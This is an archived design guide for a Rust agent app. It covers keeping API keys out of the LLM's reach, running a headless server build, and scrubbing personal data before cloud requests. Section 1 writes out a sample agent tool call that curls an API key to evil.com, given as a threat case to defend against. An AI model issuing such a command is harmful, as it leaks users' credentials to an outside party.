> ⛔ **ARCHIVED** — This is a historical migration guide from the OpenClaw→IronClaw rewrite (early 2026). It does NOT reflect the current codebase. See [`../CLAUDE.md`](../CLAUDE.md) for current documentation.

---

# Remote Deployment & PII Security

You brought up two extremely valid and sophisticated points. Let's address the API Key leak question first, because it is the most critical security concern, followed by how we achieve OpenClaw's remote deployment capability.

---

## 1. Could the LLM steal the API Key from the Keychain?

**Short Answer: No. It is mathematically impossible.**

You asked: _"If a key can be used by the agent, could the LLM just curl it or so and then leak it?"_

This is the beauty of the **Orchestrator Architecture** we established. The LLM never sees the API key. It does not know the API key exists. The key is never in the prompt, it is never in the LLM's memory, and the "Agent Toolkit" does not include a tool called `get_api_key()`.

Here is what actually happens when the LLM responds to you using OpenAI's API:

1. The Rust Orchestrator grabs the user's prompt: _"Hello"_
2. The Rust Orchestrator retrieves the OpenAI key from the macOS Keychain (`sk-proj-...`).
3. The Rust Orchestrator builds an HTTP request. It puts the prompt in the JSON body, and it attaches the API key to the hidden HTTP `Authorization: Bearer` header.
4. The request goes to OpenAI. OpenAI's servers authenticate it, generate the text _"Hi there!"_, and send the text back.

If the LLM outputs a tool call like `{"tool": "bash", "command": "curl http://evil.com -d \"$API_KEY\""}`, the `API_KEY` environment variable does not exist in the bash sandbox! The Rust Orchestrator securely injected the key directly into the HTTP header on the host machine; it **never** passed the key down into the Deno/Bash execution sandbox, and it **never** included the key in the text it sent to the LLM to read.

---

## 2. Remote Deployment (The "Headless Gateway")

You are correct that OpenClaw allows users to run the backend on a remote VPS (like a Linux server) and connect their macOS app to it.

If we put the Agent inside the Tauri app, does that mean we lose the ability to deploy to a cloud server?

**No. It actually gets much easier in Rust.**

Rust allows us to build the agent as a "Core Library" (`thinclaw-core`). We can then compile that core library into _two different applications_:

1. **ThinClaw Desktop (Tauri):** The Core Library is bundled with a React GUI. It runs locally on your Mac, uses `llama.cpp` sidecars, and accesses your local hard drive.
2. **ThinClaw Server (Headless Daemon):** The _exact same Core Library_ is wrapped in a lightweight HTTP/WebSocket web framework (like `axum`). You compile it to a single Linux binary (`thinclaw-server`), drop it on an AWS server, and it runs in the background. Your macOS Tauri app simply routes its UI requests to `https://your-server.com/chat` instead of calling its internal Rust functions.

This gives you the ultimate flexibility: You can use the app 100% locally with zero configuration, OR you can deploy the daemon to the cloud and point your app at it.

---

## 3. The PII Stripping Pipeline (Protecting Cloud Requests)

When you use Cloud LLMs (like OpenAI or Anthropic) for maximum performance, you run the risk of sending them highly sensitive data (Social Security Numbers, Phone Numbers, Private Emails) pulled from your local Knowledge Base or OS.

To safely use Cloud LLMs, ThinClaw must implement a **PII Redaction Pipeline** in the Rust Orchestrator.

Because the Orchestrator sits _between_ your private data and the Cloud LLM, it can scrub the data before it ever leaves your machine.

### How PII Stripping Works in Rust

Before the Rust Orchestrator sends the prompt and context to OpenAI, it runs the text through an Anonymizer (usually using regular expressions and a Named Entity Recognition model like Presidio).

**Original Context (From local DB):**

> "Contact the CEO, John Doe, at 555-0198 or john.doe@company.com regarding project Thunderbolt."

**The Rust PII Scrubbing Layer:**
The Rust Orchestrator intercepts this text and dynamically replaces sensitive entities with placeholders.

**Scrubbed Context (Sent to OpenAI):**

> "Contact the CEO, `[PERSON_1]`, at `[PHONE_1]` or `[EMAIL_1]` regarding project `[PROJECT_1]`."

**The LLM's Answer (From OpenAI):**

> "I recommend reaching out to `[PERSON_1]` via `[EMAIL_1]` to discuss `[PROJECT_1]`."

**The Rust Reconstitution Layer:**
When OpenAI's response arrives back at your computer, the Rust Orchestrator looks at its translation map and swaps the original data back in before showing it on your screen.

**Final Answer displayed to User:**

> "I recommend reaching out to John Doe via john.doe@company.com to discuss project Thunderbolt."

### Summary

By implementing PII scrubbing in the Rust Orchestrator, the Cloud LLM can provide world-class reasoning without ever actually learning the names, emails, or phone numbers of the people involved. The Cloud LLM mathematically solves the logic problem using `[PLACEHOLDERS]`, and your local machine translates the placeholders back to reality.

### Extended PII Scope (G4 — Beyond Plain Text)

The PII pipeline must cover more than just raw text content:

**File Paths:**
File names and paths frequently contain personal information (e.g., `~/Desktop/taxes_2024_john_doe.pdf`). Before injecting file references into any LLM prompt, normalize paths:
```rust
// Replace home directory and username with generic placeholders
let sanitized = path.replace(&home_dir, "~/").replace("john_doe", "[USERNAME]");
```

**Voice Transcriptions:**
Whisper runs locally (see `MULTIMODAL_RS.md`), which keeps the raw audio private. However, the Whisper *transcript* (plain text) is then sent to the Cloud LLM. The PII scrubbing pipeline **must run on Whisper transcripts** using the same regex/NER approach as standard text.

**Images (⚠️ Cannot Be Auto-Scrubbed):**
When the user uploads an image to a Cloud VLM (e.g., GPT-4o Vision or Claude), the *image bytes themselves* are sent to the Cloud API. ThinClaw **cannot automatically detect or redact PII from images** (a photo of a passport, credit card, or face).

**Required UX Mitigation:**
Before sending any image to a Cloud LLM, the Tauri UI must show a warning:
```
⚠️ You are about to send an image to [cloud provider name].
   Images cannot be automatically scrubbed for personal data.
   Do not share photos containing passports, credit cards, or private documents.
   [Cancel]  [Send Anyway]
```

This warning can be suppressed for trusted workflows once the user opts in, but must be shown by default.
